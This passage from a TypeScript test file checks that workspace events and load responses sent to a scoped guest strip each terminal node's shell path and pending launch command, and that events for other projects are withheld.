    nodes: [{ id: 'a1', kind: 'terminal', position: { x: 0, y: 0 }, shell: '/usr/bin/evil', pendingLaunch: { after: [], command: 'claude "held prompt text"' } }]
  })
  const ev = (channel: string, ...args: unknown[]) => JSON.stringify({ t: 'ev', channel, args })

  it('scoped guest: workspace:server-change for the shared project arrives stripped; other projects never', () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const got: string[] = []
    const sink = hooks.wrapSink!(null as never, { sendText: (j) => got.push(j), sendBinary: () => {} })
    sink.sendText(ev(IPC.workspaceServerChange, project('beta')))
    sink.sendText(ev(IPC.workspaceServerChange, project('alpha')))
    sink.sendText(ev(IPC.workspaceExternalChange, project('alpha')))
    expect(got).toHaveLength(2)
    for (const j of got) {
      const node = JSON.parse(j).args[0].nodes[0]
      expect(node.id).toBe('a1')
      expect(node.shell).toBeUndefined()
      expect(node.pendingLaunch).toBeUndefined()
      expect(j).not.toContain('held prompt text')
    }
  })

  it('scoped guest: workspace:load response is stripped', () => {
    const hooks = scopedGuestHooks('alpha', deps())
    const out = hooks.narrowResponse!(null as never, IPC.workspaceLoad, { projects: [project('alpha')] }) as {
      projects: Array<{ nodes: Array<{ shell?: string; pendingLaunch?: unknown }> }>
    }
    expect(out.projects[0].nodes[0].shell).toBeUndefined()
    expect(out.projects[0].nodes[0].pendingLaunch).toBeUndefined()
  })
})
